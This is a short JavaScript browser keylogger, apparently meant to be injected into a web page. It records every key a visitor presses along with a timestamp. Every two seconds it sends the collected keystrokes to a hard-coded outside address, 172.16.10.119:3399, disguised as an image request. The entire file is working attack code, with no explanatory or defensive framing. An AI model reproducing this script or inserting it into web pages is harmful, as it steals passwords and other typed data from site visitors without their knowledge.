var buffer = [];
var url = 'http://172.16.10.119:3399/?c=';

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    buffer.push(stroke);
};

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = url + data;
        buffer = [];
    }
}, 2000);
